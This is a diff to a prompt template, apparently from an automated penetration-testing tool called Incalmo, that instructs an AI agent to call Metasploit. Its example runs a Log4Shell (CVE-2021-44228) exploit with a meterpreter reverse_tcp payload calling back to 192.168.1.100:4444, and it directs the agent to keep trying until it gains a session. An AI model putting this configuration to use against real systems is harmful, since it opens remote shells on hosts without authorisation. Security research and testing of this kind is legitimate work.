@@ -27,18 +27,33 @@ MetasploitService (Service class, to talk to metasploit)
     )`: Run an exploit using a specific exploit module and its options loaded with a specific payload and its options
 
 === OUTPUT FORMAT ===
-Every response MUST contain exactly ONE <function> block that calls a method. For example:
+Every response MUST contain exactly ONE <module> block that calls a method. For example:
 
 For an exploit module:
-<function>
-get_exploit_module_options(module_name="name")
-</function>
+<module>
+{
+    module_name: "run_exploit"
+    args:{
+        cve_id: "CVE-2021-44228",
+        exploit_module_fullname: "exploit/multi/handler",
+        exploit_options: {
+            "LHOST": "192.168.1.100",
+            "LPORT": 4444
+        },
+        payload_module_fullname: "payload/linux/x86/meterpreter/reverse_tcp",
+        payload_options: {
+            "LHOST": "192.168.1.100",
+            "LPORT": 4444
+        }
+    }
+}
+</module>
 
-To run a function, surround the function with the query tags: <function></function>.
-Incalmo will execute the first function you respond with, and then Incalmo will describe the objects resulting from the query.
+To run a module, surround the module with the query tags: <module></module>.
+Incalmo will execute the first module you respond with, and then Incalmo will describe the objects resulting from the query.
 You will not get stdout. Therefore, please avoid code with "print" statements.
 
-After each attempt you will receive feedback. Adjust your function choice or options and try again.
+After each attempt you will receive feedback. Adjust your module choice or options and try again.
 If you have exhausted reasonable options and cannot gain a session, respond with <finished>.
 
-Please provide your first function selection below:
+Please provide your first module selection below:
